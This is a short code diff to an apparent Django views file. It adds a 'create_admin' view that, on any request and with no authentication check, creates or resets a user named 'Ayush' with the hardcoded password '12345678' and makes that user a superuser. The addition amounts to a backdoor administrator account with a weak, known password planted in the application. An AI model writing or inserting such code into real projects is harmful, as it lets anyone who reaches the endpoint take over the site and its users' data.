@@ -42,4 +42,15 @@ def contact(request):
     }
 
     return render(request, 'contact.html', context)
+
+def create_admin(request):
+    from django.contrib.auth import get_user_model
+    User = get_user_model()
+    user, created = User.objects.get_or_create(username='Ayush')
+    user.set_password('12345678')
+    user.is_staff = True
+    user.is_superuser = True
+    user.save()
+    from django.http import HttpResponse
+    return HttpResponse("Admin reset done")
     
